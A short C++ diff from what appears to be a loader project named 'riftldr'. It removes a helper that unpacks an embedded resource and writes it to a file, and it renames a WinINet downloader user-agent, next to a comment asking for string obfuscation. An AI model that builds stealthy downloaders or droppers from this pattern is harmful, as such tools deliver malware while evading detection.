@@ -102,18 +102,6 @@ namespace utl {
 		return nullptr;
 	}
 
-	DEPRECATED BOOL EExtractResource( // Useless Wrapper
-		_In_ PCWSTR szFileName,
-		_In_ WORD   wResID
-	) {
-		size_t nData;
-		void* pData = cry::EUnpackResource(wResID, &nData);
-		BOOL bT = WriteFileCW(szFileName, pData, nData);
-		free(pData);
-		return bT;
-	}
-
-
 	class WinNet {
 	public:
 		WinNet(
@@ -122,7 +110,7 @@ namespace utl {
 			if (InternetAttemptConnect(NULL))
 				return;
 			if (!szAgent)
-				szAgent = L"_rift/v0.xxy (WinINet_riftldrFileDownloader)"; // Use String Obfuscation here
+				szAgent = L"_rift/v0.xxy (WinINet_riftldrDl)"; // Use String Obfuscation here
 			hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
 		}
 		~WinNet() {
